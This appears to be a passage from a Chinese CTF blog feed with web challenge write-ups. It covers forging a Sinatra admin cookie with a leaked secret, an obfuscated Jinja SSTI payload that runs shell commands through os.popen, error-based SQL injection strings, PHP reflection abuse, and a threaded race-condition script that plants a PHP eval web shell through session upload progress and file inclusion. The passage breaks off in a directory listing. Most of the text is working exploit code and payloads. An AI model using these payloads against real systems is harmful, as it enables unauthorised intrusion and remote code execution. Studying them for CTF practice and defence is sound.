<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#&#123;%x|ls|&#125;&#x2F;&#x2F;执行了系统命令</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#Gemfile</span><br><span class="line">Gemfile.lock</span><br><span class="line">database.db</span><br><span class="line">public</span><br><span class="line">vendor</span><br><span class="line">views</span><br><span class="line">webserver.rb</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用cat命令即可查看源码：</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">configure <span class="keyword">do</span></span><br><span class="line">  set <span class="symbol">:public_folder</span>, <span class="string">&#x27;public&#x27;</span></span><br><span class="line">  set <span class="symbol">:views</span>, <span class="string">&#x27;views&#x27;</span></span><br><span class="line">  set <span class="symbol">:bind</span>, <span class="string">&#x27;0.0.0.0&#x27;</span></span><br><span class="line">  set <span class="symbol">:port</span>, <span class="number">9999</span></span><br><span class="line">  enable <span class="symbol">:sessions</span></span><br><span class="line">  set <span class="symbol">:server</span>, <span class="string">%w[thin webrick]</span></span><br><span class="line">  set <span class="symbol">:environment</span>, <span class="symbol">:production</span></span><br><span class="line">  <span class="comment">#set :environment, :development</span></span><br><span class="line">  <span class="comment">#disable :protection</span></span><br><span class="line">  set <span class="symbol">:session_secret</span>, <span class="string">&#x27;01344904559362f6f5754df256908476702c8bd5d972a32e2fae2a7cc6fa4a7efd25079fddb5a11a0f8be0f607bf048fd6ecfe065380c27b2aa26015c3308e85&#x27;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line">get <span class="string">&#x27;/home&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  authenticate!</span><br><span class="line">  @user = session[<span class="symbol">:username</span>]</span><br><span class="line">  @flag = ENV[<span class="string">&#x27;FLAG&#x27;</span>] <span class="keyword">if</span> session[<span class="symbol">:role</span>] == <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">  slim <span class="symbol">:home</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p>关键在这里，所以我们需要伪造admin cookie</p>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;uri&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;pp&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;base64&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;digest/sha1&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;faraday&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remote host</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_hmac</span><span class="params">(data, secret)</span></span></span><br><span class="line">    OpenSSL::HMAC.hexdigest(OpenSSL::Digest::SHA1.new, secret, data)</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL = &quot;http://39.96.91.106:8230/login&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # Create URL object</span></span><br><span class="line"><span class="comment"># url = URI.parse(URL) </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># creds = &quot;demo&quot;</span></span><br><span class="line"><span class="comment"># c = &quot;&quot;</span></span><br><span class="line"><span class="comment"># # Authentication</span></span><br><span class="line"><span class="comment"># resp = Net::HTTP.start(url.host, url.port) do |http|</span></span><br><span class="line"><span class="comment">#     http.post(url.request_uri, &quot;username=#&#123;creds&#125;&amp;password=#&#123;creds&#125;&quot;)</span></span><br><span class="line"><span class="comment"># end</span></span><br><span class="line"></span><br><span class="line">Cookies = <span class="string">&quot;BAh7CkkiDXVzZXJuYW1lBjoGRUZJIglkZW1vBjsAVEkiCXJvbGUGOwBGSSIJ%0AdXNlcgY7AFRJIg9zZXNzaW9uX2lkBjsAVEkiRTAyMjU1OTdiMjJhYWM4Zjc3%0AYjcxZGUwNzQ2MjBlM2JiN2E5NDA1ODlmOWJjOTg5NWNiMTU3YzBlYTgyZGI5%0AYzIGOwBGSSIJY3NyZgY7AEZJIjF4MDlxTHVlOXdOZjNFWGx3T2ZzWjVXYlZ1%0ANEU5dnhBdW04TTk0Q3JZM1EwPQY7AEZJIg10cmFja2luZwY7AEZ7BkkiFEhU%0AVFBfVVNFUl9BR0VOVAY7AFRJIi00ZTRhYWEyYmFhZmVjYmIxYjcwOTViZWQ2%0AZDZmZWYzMmM3ZWI4NzEwBjsARg%3D%3D%0A--957bdf7dc19049010fd0b19e4d8656c42314b2db&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># puts get the cookie</span></span><br><span class="line">cookie, signature = Cookies.split(<span class="string">&quot;--&quot;</span>,<span class="number">2</span>)</span><br><span class="line">cookie = URI.decode(cookie)</span><br><span class="line"></span><br><span class="line">decoded = Base64.decode64(URI.decode(cookie))</span><br><span class="line">params = Marshal.load(decoded)</span><br><span class="line">params.merge!(&#123; <span class="string">&#x27;role&#x27;</span> =&gt;<span class="string">&quot;admin&quot;</span>&#125;)</span><br><span class="line"></span><br><span class="line">print(params)</span><br><span class="line">bad_cookie = URI.encode(Base64.encode64(Marshal.dump(params)))</span><br><span class="line">bad_hmac = generate_hmac(bad_cookie, <span class="string">&quot;01344904559362f6f5754df256908476702c8bd5d972a32e2fae2a7cc6fa4a7efd25079fddb5a11a0f8be0f607bf048fd6ecfe065380c27b2aa26015c3308e85&quot;</span>)</span><br><span class="line">header = <span class="string">&quot;rack.session=<span class="subst">#&#123;bad_cookie&#125;</span>--<span class="subst">#&#123;bad_hmac&#125;</span>;&quot;</span></span><br><span class="line">print(header)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>贴一下学长写的</p>
<p>在kali ruby环境下跑一下！<br>注意，需要去题目的第二个入口伪造cookie才行！！！！！！</p>
<p>接下来就可以拿到flag了</p>
<h2 id="LOVE-SSTI："><a href="#LOVE-SSTI：" class="headerlink" title="LOVE-SSTI："></a>LOVE-SSTI：</h2><p>一开始的脑洞很烦，暹罗猫那个表情包有个别名 叫小豆泥，所以注入点是?xiaodouni=</p>
<p>接下来就是常规的ssti注入了，主要是去__doc__里面取字符，由于要查找flag，所以需要一个<em>号，但是没找到\</em>，写了个脚本要找*号，但是网站似乎不让爆破==就很难受，</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://39.96.91.106:3010/?xiaodouni=&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">headers=requests.session().headers</span><br><span class="line">payload=<span class="string">&quot;&#123;%set%20a=dict(op=x,p=x)|join()%&#125;&#123;%set%20b=(()|select|string|list)|attr(a)(24)%&#125;&#123;%set%20c=(b,b,dict(doc=a)|join,b,b)|join%&#125;&#123;%set%20g=(x|attr(c)|list)|&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10000</span>):</span><br><span class="line">    payload_fi=payload+<span class="string">f&quot;attr(a)(<span class="subst">&#123;i&#125;</span>)%&quot;</span>+<span class="string">&quot;&#125;&#123;&#123;g&#125;&#125;&quot;</span></span><br><span class="line">    url_f=url+payload_fi</span><br><span class="line">    print(s.get(url=url_f,headers=headers).text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;*&quot;</span> <span class="keyword">in</span> s.get(url=url_f,headers=headers).text:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>所以就去找了一下其他方法。payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;%set a&#x3D;dict(op&#x3D;x,p&#x3D;x)|join()%&#125;&#123;%set b&#x3D;(()|select|string|list)|attr(a)(24)%&#125;&#123;%set c&#x3D;(b,b,dict(doc&#x3D;a)|join,b,b)|join%&#125;</span><br><span class="line">&#123;%set g&#x3D;(x|attr(c)|list)|attr(a)(320)%&#125;&#123;%set gl&#x3D;(b,b,dict(globals&#x3D;a)|join,b,b)|join%&#125;&#123;%set bu&#x3D;(b,b,dict(builtins&#x3D;a)|join,b,b)|join%&#125;&#123;% set cr&#x3D;(lipsum|attr(gl)|attr(&quot;get&quot;)(bu))[&quot;ch&quot;&quot;r&quot;] %&#125;&#123;%set d&#x3D;cr(42)%&#125;&#123;% set or&#x3D;(&quot;find &#x2F; -name &quot;,d,&quot;fla&quot;,d)|join%&#125;</span><br><span class="line">&#123;% set or1 &#x3D; &quot;cat &#x2F;usr&#x2F;fla??is?here?txt&quot;%&#125;&#123;&#123;(lipsum|attr(gl)|attr(&quot;get&quot;)(&quot;o&quot;&quot;s&quot;)|attr(&quot;po&quot;&quot;pen&quot;)(or1))|attr(&quot;read&quot;)()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p>至此 web的所有题目都ak。学到了很多~</p>
]]></content>
  </entry>
  <entry>
    <title>CISCN web</title>
    <url>/2021/05/25/CISCN-web/</url>
    <content><![CDATA[<h2 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy_sql"></a>easy_sql</h2><p>输入信息 会报错<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210515133740.png" alt="img"></p>
<p> 根据报错信息 sql注入 需要用’)绕过闭合</p>
<p>因为有报错，尝试报错注入:</p>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;)and extractvalue(1,concat(&#39;~&#39;,(select * from (select * from flag as a join flag b)c)))#</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210515134036.png" alt="img" style="zoom:67%;">

<p>这里的库又禁用了，想起来上次就是直接猜表名为flag于是</p>
<p>尝试payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;)and extractvalue(1,concat(&#39;~&#39;,(select 1 from flag)))#</span><br><span class="line">1&#39;)and extractvalue(1,concat(&#39;~&#39;,(select aaa from fla)))#</span><br><span class="line">通过回显可以发现表名果然为flag</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;)and extractvalue(1,concat(&#39;~&#39;,(select * from (select * from flag as a join flag b using(id,no))c)))#</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210515134150.png" alt="img" style="zoom:67%;">
获得列名

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;)and extractvalue(1,concat(&#39;~&#39;,(select &#96;87ed65c7-b43b-4438-a4b7-eed85ab78d4b&#96; from flag)))#</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210515134247.png" alt="img"></p>
<p>需要substr截取：<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210515134337.png" alt="img" style="zoom:67%;"></p>
<p>参考文章:<a href="https://reader-l.github.io/2020/06/01/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/">https://reader-l.github.io/2020/06/01/%E6%97%A0%E5%88%97%E5%90%8D%E6%B3%A8%E5%85%A5%E5%B0%8F%E8%AE%B0/</a></p>
<h2 id="easy-source"><a href="#easy-source" class="headerlink" title="easy_source"></a>easy_source</h2><p>看看备份目录 .index.php.swo</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> $c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">j</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$rc=$_GET[<span class="string">&quot;rc&quot;</span>];</span><br><span class="line">$rb=$_GET[<span class="string">&quot;rb&quot;</span>];</span><br><span class="line">$ra=$_GET[<span class="string">&quot;ra&quot;</span>];</span><br><span class="line">$rd=$_GET[<span class="string">&quot;rd&quot;</span>];</span><br><span class="line">$method= <span class="keyword">new</span> $rc($ra, $rb);</span><br><span class="line">var_dump($method-&gt;$rd());</span><br></pre></td></tr></table></figure>

<p>找到源码，发现是php反射问题</p>
<p>反射类中存在两个参数的就是ReflectionMethod()<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210515150028.png" alt="img" style="zoom:67%;"></p>
<p>和题目吗一毛一样接下来就看要运用哪个函数了:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$method&#x3D;new ReflectionMethod(User,a);</span><br><span class="line">var_dump($method-&gt;getDocComment)</span><br><span class="line">rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;a&amp;rd&#x3D;getDocComment</span><br><span class="line">&#x2F;&#x2F;有个坑 他的flag是藏在其中一个方法的注释当中的，需要遍历一下！</span><br><span class="line">rc&#x3D;ReflectionMethod&amp;ra&#x3D;User&amp;rb&#x3D;q&amp;rd&#x3D;getDocComment</span><br></pre></td></tr></table></figure>

<p>PHP手册:<a href="https://www.php.net/manual/zh/class.reflectionmethod.php">https://www.php.net/manual/zh/class.reflectionmethod.php</a></p>
<h2 id="middle-source"><a href="#middle-source" class="headerlink" title="middle_source"></a>middle_source</h2><p>一开始扫描目录，获得you_can_seeeeeeee_me.php</p>
<p>发现是phpinfo的配置文件<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210516004816.png" alt="img" style="zoom:67%;"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;fjjefccdjd</span><br></pre></td></tr></table></figure>

<p>看到很奇怪的session目录——&gt;考点文件包含+利用session进行文件上传（条件竞争）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">sessid = <span class="string">&#x27;TGAO&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;cmd&quot;</span>:<span class="string">&quot;var_dump(scandir(&#x27;/etc/gcbcgffhac/egdcbahfbh/dedhfgiaai/dajfeeacie/aeebhaaejd/fl444444g&#x27;));&quot;</span>,<span class="string">&quot;cf&quot;</span>:<span class="string">&quot;../../../var/lib/php/sessions/fjjefccdjd/sess_&quot;</span>+sessid&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.post( <span class="string">&#x27;http://124.70.0.162:24693&#x27;</span>, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;tgao.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post(<span class="string">&#x27;http://124.70.0.162:24693&#x27;</span>,data=data)</span><br><span class="line">        print(resp.text)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="comment"># if &#x27;passwd&#x27; in resp.text:</span></span><br><span class="line">        <span class="comment">#     print(resp.text)</span></span><br><span class="line">        <span class="comment">#     break</span></span><br><span class="line">        <span class="comment">#     event.clear()</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;[+++++++++++++]retry&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.set()</span><br></pre></td></tr></table></figure>

<p>需要注意的是 etc的目录需要一个个跑</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">​&#96;&#96;&#96;</span><br><span class="line">[0]&#x3D;&gt;</span><br><span class="line">  string(1) &quot;.&quot;</span><br><span class="line">  [1]&#x3D;&gt;</span><br><span class="line">  string(2) &quot;..&quot;</span><br><span class="line">  [2]&#x3D;&gt;</span><br><span class="line">  string(9) &quot;.pwd.lock&quot;</span><br><span class="line">  [3]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;X11&quot;</span><br><span class="line">  [4]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;adduser.conf&quot;</span><br><span class="line">  [5]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;alternatives&quot;</span><br><span class="line">  [6]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;apache2&quot;</span><br><span class="line">  [7]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;apparmor.d&quot;</span><br><span class="line">  [8]&#x3D;&gt;</span><br><span class="line">  string(3) &quot;apt&quot;</span><br><span class="line">  [9]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;bash.bashrc&quot;</span><br><span class="line">  [10]&#x3D;&gt;</span><br><span class="line">  string(17) &quot;bash_completion.d&quot;</span><br><span class="line">  [11]&#x3D;&gt;</span><br><span class="line">  string(22) &quot;bindresvport.blacklist&quot;</span><br><span class="line">  [12]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;binfmt.d&quot;</span><br><span class="line">  [13]&#x3D;&gt;</span><br><span class="line">  string(15) &quot;ca-certificates&quot;</span><br><span class="line">  [14]&#x3D;&gt;</span><br><span class="line">  string(20) &quot;ca-certificates.conf&quot;</span><br><span class="line">  [15]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;cron.d&quot;</span><br><span class="line">  [16]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;cron.daily&quot;</span><br><span class="line">  [17]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;cron.weekly&quot;</span><br><span class="line">  [18]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;dbus-1&quot;</span><br><span class="line">  [19]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;debconf.conf&quot;</span><br><span class="line">  [20]&#x3D;&gt;</span><br><span class="line">  string(14) &quot;debian_version&quot;</span><br><span class="line">  [21]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;default&quot;</span><br><span class="line">  [22]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;deluser.conf&quot;</span><br><span class="line">  [23]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;dhcp&quot;</span><br><span class="line">  [24]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;dpkg&quot;</span><br><span class="line">  [25]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;environment&quot;</span><br><span class="line">  [26]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;fstab&quot;</span><br><span class="line">  [27]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;gai.conf&quot;</span><br><span class="line">  [28]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;gcbcgffhac&quot;</span><br><span class="line">  [29]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;group&quot;</span><br><span class="line">  [30]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;group-&quot;</span><br><span class="line">  [31]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;gshadow&quot;</span><br><span class="line">  [32]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;gshadow-&quot;</span><br><span class="line">  [33]&#x3D;&gt;</span><br><span class="line">  string(9) &quot;host.conf&quot;</span><br><span class="line">  [34]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;hostname&quot;</span><br><span class="line">  [35]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;hosts&quot;</span><br><span class="line">  [36]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;init&quot;</span><br><span class="line">  [37]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;init.d&quot;</span><br><span class="line">  [38]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;inputrc&quot;</span><br><span class="line">  [39]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;insserv&quot;</span><br><span class="line">  [40]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;insserv.conf&quot;</span><br><span class="line">  [41]&#x3D;&gt;</span><br><span class="line">  string(14) &quot;insserv.conf.d&quot;</span><br><span class="line">  [42]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;issue&quot;</span><br><span class="line">  [43]&#x3D;&gt;</span><br><span class="line">  string(9) &quot;issue.net&quot;</span><br><span class="line">  [44]&#x3D;&gt;</span><br><span class="line">  string(6) &quot;kernel&quot;</span><br><span class="line">  [45]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;ld.so.cache&quot;</span><br><span class="line">  [46]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;ld.so.conf&quot;</span><br><span class="line">  [47]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;ld.so.conf.d&quot;</span><br><span class="line">  [48]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;ldap&quot;</span><br><span class="line">  [49]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;legal&quot;</span><br><span class="line">  [50]&#x3D;&gt;</span><br><span class="line">  string(13) &quot;libaudit.conf&quot;</span><br><span class="line">  [51]&#x3D;&gt;</span><br><span class="line">  string(12) &quot;locale.alias&quot;</span><br><span class="line">  [52]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;locale.gen&quot;</span><br><span class="line">  [53]&#x3D;&gt;</span><br><span class="line">  string(9) &quot;localtime&quot;</span><br><span class="line">  [54]&#x3D;&gt;</span><br><span class="line">  string(8) &quot;logcheck&quot;</span><br><span class="line">  [55]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;login.defs&quot;</span><br><span class="line">  [56]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;logrotate.d&quot;</span><br><span class="line">  [57]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;lsb-release&quot;</span><br><span class="line">  [58]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;machine-id&quot;</span><br><span class="line">  [59]&#x3D;&gt;</span><br><span class="line">  string(5) &quot;magic&quot;</span><br><span class="line">  [60]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;magic.mime&quot;</span><br><span class="line">  [61]&#x3D;&gt;</span><br><span class="line">  string(7) &quot;mailcap&quot;</span><br><span class="line">  [62]&#x3D;&gt;</span><br><span class="line">  string(13) &quot;mailcap.order&quot;</span><br><span class="line">  [63]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;mime.types&quot;</span><br><span class="line">  [64]&#x3D;&gt;</span><br><span class="line">  string(11) &quot;mke2fs.conf&quot;</span><br><span class="line">  [65]&#x3D;&gt;</span><br><span class="line">  string(14) &quot;modules-load.d&quot;</span><br><span class="line">  [66]&#x3D;&gt;</span><br><span class="line">  string(4) 